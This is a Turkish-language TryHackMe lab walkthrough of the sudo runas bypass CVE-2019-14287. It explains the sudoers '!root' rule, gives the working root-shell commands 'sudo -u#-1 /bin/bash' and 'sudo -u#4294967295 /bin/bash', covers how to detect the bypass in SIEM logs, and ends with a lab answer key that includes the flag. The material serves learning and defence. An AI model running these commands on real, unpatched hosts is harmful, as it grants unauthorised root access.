# 📓 THM - Sudo Security Bypass (CVE-2019-14287)

**Tags:** #BlueTeam #PrivilegeEscalation #SudoBypass #CVE201914287 #LinuxSecurity #Sudoers #SOC_L1 #TryHackMe #Walkthrough

## 🏗️ Mimari Yapı

Linux ve Unix tabanlı sistemlerde **Sudo (Superuser Do)** komutu, yetkisiz veya sınırlı yetkili kullanıcıların belirli komutları başka kullanıcıların (varsayılan olarak `root`) kimliğiyle çalıştırmasını sağlayan en temel erişim denetimi mekanizmasıdır.

Bu denetim mekanizmasının davranış kuralları ve kullanıcı yetki sınırları **`/etc/sudoers`** yapılandırma dosyası ile yönetilir. Sistem yöneticileri bazen bir kullanıcıya belirli komutları çalıştırma yetkisi verirken, `root` yetkilerini kısıtlamak amacıyla `!root` (root hariç) mantıksal ifadesini kullanırlar.

```
                   [ Linux /etc/sudoers Yetki Denetim Mimarisi ]
                                         │
         ┌───────────────────────────────┴───────────────────────────────┐
         ▼                                                               ▼
[ Standart Çalışma Mantığı ]                                   [ CVE-2019-14287 Mantıksal Açığı ]
- Kullanıcı: `sudo -u#<UID> <command>`                         - Girdi: `sudo -u#-1 <command>`
- Sudoers: `(ALL:!root) NOPASSWD: ALL`                         - Sudo Tamsayı Hatası (Integer Overflow/Underflow)
- Sonuç: UID 0 (root) doğrudan engellenir.                    - Sonuç: `-1` veya `4294967295` değeri `0` (root) olarak işlenir!
```

**CVE-2019-14287 zafiyeti**, Sudo programının 1.8.28 öncesi sürümlerinde, kullanıcı kimlik numarası (UID) tam sayı dönüştürme mantığındaki bir hatadan kaynaklanır. Sistem `!root` kısıtlaması koysa bile, tamsayı olarak `-1` veya bunun işaretsiz 32-bit karşılığı olan `4294967295` girildiğinde, Sudo bunu dahili olarak `0` (root UID) olarak okur ve kısıtlamayı baypas ederek tam yetkili (root) komut koşturulmasını sağlar.

## 💻 Tüm Komutlar, Parametreler ve Kod Parçacıkları

### A. Uzak Sunucu Bağlantısı (SSH)

- **SSH Bağlantı Komutu:**
    
    Bash
    
    ```
    ssh -p 2222 tryhackme@MACHINE_IP
    ```
    
    - `ssh`: Secure Shell protokolü üzerinden uzak sunucuya güvenli terminal bağlantısı açar.
        
    - `-p 2222`: Standart 22 olan SSH portu yerine özel `2222` portu üzerinden bağlanılacağını belirtir.
        
    - `tryhackme@MACHINE_IP`: `MACHINE_IP` adresindeki sunucuya `tryhackme` kullanıcı adı ile oturum açma isteği atar. (Parola: `tryhackme`).
        

### B. Yetki Denetimi ve Zafiyet Saptama Komutları

- **Mevcut Yetkileri Listeleme:**
    
    Bash
    
    ```
    sudo -l
    ```
    
    - `-l` (list): Mevcut kullanıcının `/etc/sudoers` dosyasında tanımlanmış hangi Sudo haklarına ve kısıtlamalarına sahip olduğunu listeler.
        
    - **Örnek Sudoers Çıktısı:**
        
        Plaintext
        
        ```
        (ALL:!root) NOPASSWD: ALL
        ```
        
        - `(ALL:!root)`: Kullanıcının `root` HARİÇ diğer tüm kullanıcıların kimliğiyle komut koşturabileceğini belirtir.
            
        - `NOPASSWD`: Bu komutlar çalıştırılırken parola sorulmayacağını ifade eder.
            
- **Sudoers Dosyası Güvenli Düzenleme:**
    
    Bash
    
    ```
    sudo visudo
    ```
    
    - `visudo`: `/etc/sudoers` dosyasını düzenlerken sözdizimi (syntax) hatalarını otomatik denetleyen güvenli metin editörüdür. Doğrudan `nano` veya `vim` ile düzenleme yapmak işletim sistemini kilitlediği için önerilmez.
        

### C. Zafiyet İstismar (Exploit) ve Yetki Yükseltme Komutları

- **UID -1 Yöntemi ile Root Shell Açma:**
    
    Bash
    
    ```
    sudo -u#-1 /bin/bash
    ```
    
    - `sudo`: Başka kullanıcı kimliğiyle çalıştırma komutunu başlatır.
        
    - `-u#`: Kullanıcıyı ismi yerine sayısal **UID (User ID)** değeri ile hedefleyeceğimizi belirtir (İşaret işareti `#` zorunludur).
        
    - `-1`: Zafiyeti tetikleyen özel UID değeridir. Sudo bu değeri işlerken `-1` dönüştürme hatası yüzünden `0` (root) kabul eder.
        
    - `/bin/bash`: Root yetkileriyle yeni bir interaktif Bash kabuğu başlatır.
        
- **İşaretsiz 32-Bit (Unsigned Integer) Alternatif Yöntemi:**
    
    Bash
    
    ```
    sudo -u#4294967295 /bin/bash
    ```
    
    - `4294967295`: `-1` değerinin 32-bitlik işaretsiz tamsayı ($2^{32} - 1$) karşılığıdır. Sudo tarafında tamsayı taşması/dönüşümü yaşatarak aynı şekilde root yetkisi verir.
        
- **Erişim ve Hak Doğrulama:**
    
    Bash
    
    ```
    whoami
    # Çıktı: root
    
    cat /root/root.txt
    ```
    
    - `whoami`: O an aktif olan kabuğun hangi kullanıcı yetkisinde olduğunu doğrular.
        
    - `cat /root/root.txt`: Kök dizin altındaki hedef bayrak dosyasını okur.
        

## 📊 Teknik Veriler ve Sınıflandırmalar

### A. Sudo /etc/sudoers Konfigürasyon Yapılandırma Tablosu

|**Sudoers Kural Mantığı**|**Açıklama ve Yetki Kapsamı**|**Güvenlik Durumu ve Risk**|
|---|---|---|
|`user ALL=(ALL) ALL`|Kullanıcı parola girerek **herhangi bir kullanıcının (root dahil)** kimliğiyle her komutu çalıştırabilir.|Tam yetkili sistem yöneticisi tanımı.|
|`user ALL=(ALL:!root) NOPASSWD: ALL`|Kullanıcı parola girmeden `root` HARİÇ tüm kullanıcılar adına komut koşturabilir.|**CVE-2019-14287'ye açık zafiyetli durum!**|
|`user ALL=(ALL) NOPASSWD: /bin/cat`|Kullanıcı şifresiz şekilde sadece `cat` komutunu root yetkisiyle koşturabilir.|Sınırlı yetki (Komut özelinde zafiyet barındırmıyorsa güvenli).|

### B. Zafiyet Teknik Özeti (CVE-2019-14287)

|**Metrik**|**Teknik Değer ve Bilgi**|
|---|---|
|**Zafiyet Adı**|Sudo Local Privilege Escalation via RunAs User ID Bypass|
|**CVE Kodu**|CVE-2019-14287|
|**Keşfeden Araştırmacı**|Joe Vennix (Apple)|
|**Etkilenen Sürümler**|Sudo 1.8.28 öncesi tüm versiyonlar (`< 1.8.28`)|
|**Düzeltildiği Sürüm**|Sudo 1.8.28 ve sonrası|
|**Saldırı Önkoşulu**|Kullanıcının `/etc/sudoers` dosyasında `!root` kısıtlamasıyla NOPASSWD veya bildiği bir komuta Sudo yetkisinin olması.|

## 🧠 Uzman Notları ve Kritik Uyarılar

> ⚠️ **MÜLAKAT HAPI - "SUDO -U#0" VE "SUDO -U#-1" FARKI:**
> 
> Mülakatlarda _"Linux yetki yükseltmede Sudoers dosyasındaki !root tanımını nasıl baypas edersiniz?"_ sorusu geldiğinde verilecek yanıt:
> 
> Normal şartlarda Sudo'da UID belirtmek için `-u#` parametresi kullanılır. Root kullanıcısının UID değeri `0` olduğu için normalde `sudo -u#0 <command>` yazılır. Ancak konfigürasyonda `!root` (veya `!#0`) engeli varsa bu komut reddedilir. **CVE-2019-14287 zafiyetinde**, Sudo `-1` veya `4294967295` değerlerini `0` olarak işlediği için `sudo -u#-1 <command>` yazılarak `!root` filtresi sunucu tarafında baypas edilir.

> 💡 **SEKTÖREL İPUCU - LOG YANILSAMASI VE SIEM TESPİTİ:**
> 
> Bu zafiyet istismar edildiğinde `/var/log/auth.log` veya `auditd` kayıtlarında saldırganın açıkça `root` olarak komut koşturduğu görünmeyebilir. Loglarda `RUNAS=4294967295` veya `RUNAS=-1` ifadeleri yer alabilir. Bir SOC analisti olarak SIEM panellerinde `sudo` logları taranırken `-u#-1` veya `4294967295` girdileri için otomatik **Critical Alarm (Yüksek Öncelikli Uyarı)** kuralı oluşturulmalıdır.

> 🚨 **KRİTİK UYARI - SYNTAX VE KABUK (SHELL) HATALARI:**
> 
> Sudoers dosyasında veya terminalde UID belirtirken `-u` ile `#` işareti arasında boşluk bırakılmamalıdır.
> 
> - ❌ **Hatalı:** `sudo -u #-1 /bin/bash`
>     
> - ✔️ **Doğru:** `sudo -u#-1 /bin/bash`
>     
> 
> Boşluk bırakılırsa `#-1` ifadesi terminal tarafından yorum (comment) olarak algılanır ve komut hatalı çalışır.

## 🗃️ Soru-Cevap Anahtarı

| **Pratik / Laboratuvar Sorusu**                                                                                          | **Doğru Cevap**             |
| ------------------------------------------------------------------------------------------------------------------------ | --------------------------- |
| `tryhackme` kullanıcısının Sudo haklarında (`sudo -l`) çalıştırmasına izin verilen hedef komut nedir?                    | `/bin/bash`                 |
| **[LAB]** `sudo -u#-1 /bin/bash` komutuyla root yetkisi alındıktan sonra `/root/root.txt` dosyasından okunan flag nedir? | `THM{l33t_s3cur1ty_bypass}` |